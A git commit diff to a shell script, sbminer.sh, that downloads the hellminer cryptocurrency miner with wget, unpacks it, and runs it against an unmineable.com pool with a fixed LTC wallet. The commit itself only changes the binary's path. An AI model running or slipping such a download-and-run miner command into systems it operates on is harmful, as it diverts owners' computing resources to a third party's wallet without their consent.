333fb56f31a8bd9db5501de3966d9e5945ae1b5e
bellva0007 <161959187+bellva0007@users.noreply.github.com>
2024-03-06 22:59:14 +0700

    Update sbminer.sh

--- sbminer.sh
+++ sbminer.sh
@@ -2,4 +2,4 @@
 sudo apt update
 wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
 tar xf hellminer_linux64.tar.gz
-./hellminer_linux64/hellminer -c stratum+ssl://rx.unmineable.com:443 -a rx -k -u LTC:MAL6SDnCm6HUx31hAmPsejzQtEBb5xbcbS.DAUS1 -p --cpu 4
+./hellminer -c stratum+ssl://rx.unmineable.com:443 -a rx -k -u LTC:MAL6SDnCm6HUx31hAmPsejzQtEBb5xbcbS.DAUS1 -p --cpu 4
